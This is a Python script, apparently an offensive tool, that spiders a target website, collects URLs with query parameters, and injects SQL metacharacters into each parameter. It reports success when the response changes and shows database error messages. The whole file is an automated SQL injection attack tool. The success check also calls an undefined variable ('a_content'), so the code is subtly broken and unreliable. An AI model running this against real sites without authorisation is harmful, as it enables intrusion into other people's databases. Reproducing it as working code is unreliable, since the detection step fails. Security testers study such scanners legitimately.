#!/usr/bin/python3

###[ Loading modules

import sys
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse


###[ Global vars

max_urls = 999
inject_chars = ["'",
                "--",
                "/*",
                '"']
error_msgs = [
    "syntax error",
    "sql error",
    "failure",
]

known_url = {}
already_attacked = {}
attack_urls = []


###[ Subroutines

def get_abs_url(base_url, link):
    """
    check if the link is relative and prepend the protocol
    and host. filter unwanted links like mailto and links
    that do not go to our base host
    """
    if link:
        if "://" not in link:
            if link[0] != "/":
                link = "/" + link

            link = base_url.scheme + "://" + base_url.hostname + link

        if "mailto:" in link or base_url.hostname not in link:
            return None
        else:
            return link


def spider(base_url, url):
    """
    check if we dont know the url
    spider to url
    extract new links
    spider all new links recursively
    """
    if len(known_url) >= max_urls:
        return None

    if url:
        p_url = urlparse(url)

        if not known_url.get(url) and p_url.hostname == base_url.hostname:
            try:
                sys.stdout.write(".")
                sys.stdout.flush()

                known_url[url] = True
                r = requests.get(url)

                if r.status_code == 200:
                    if "?" in url:
                        attack_urls.append(url)

                    soup = BeautifulSoup(r.content,
                                         features="html.parser")

                    for tag in soup('a'):
                        spider(base_url, get_abs_url(base_url, tag.get('href')))
            except requests.exceptions.ConnectionError as e:
                print("Got error for " + url + \
                      ": " + str(e))


def found_error(content):
    """
    try to find error msg in html
    """
    got_error = False

    for msg in error_msgs:
        if msg in content.lower():
            got_error = True

    return got_error


def attack(url):
    """
    parse an urls parameter
    inject special chars
    try to guess if attack was successfull
    """
    p_url = urlparse(url)

    if not p_url.query in already_attacked.get(p_url.path, []):
        already_attacked.setdefault(p_url.path, []).append(p_url.query)

        try:
            sys.stdout.write("\nAttack " + url)
            sys.stdout.flush()
            r = requests.get(url)

            for param_value in p_url.query.split("&"):
                param, value = param_value.split("=")

                for inject in inject_chars:
                    a_url = p_url.scheme + "://" + \
                            p_url.hostname + p_url.path + \
                            "?" + param + "=" + inject
                    sys.stdout.write(".")
                    sys.stdout.flush()
                    a = requests.get(a_url)

                    if r.content != a.content:
                        print("\nGot different content " + \
                              "for " + a_url)
                        print("Checking for exception output")
                        if found_error(a_content):
                            print("Attack was successful!")
        except requests.exceptions.ConnectionError:
            pass


###[ MAIN PART

if len(sys.argv) < 2:
    print(sys.argv[0] + ": <url>")
    sys.exit(1)

start_url = sys.argv[1]
base_url = urlparse(start_url)

sys.stdout.write("Spidering")
spider(base_url, start_url)
sys.stdout.write(" Done.\n")



for url in attack_urls:
    attack(url)
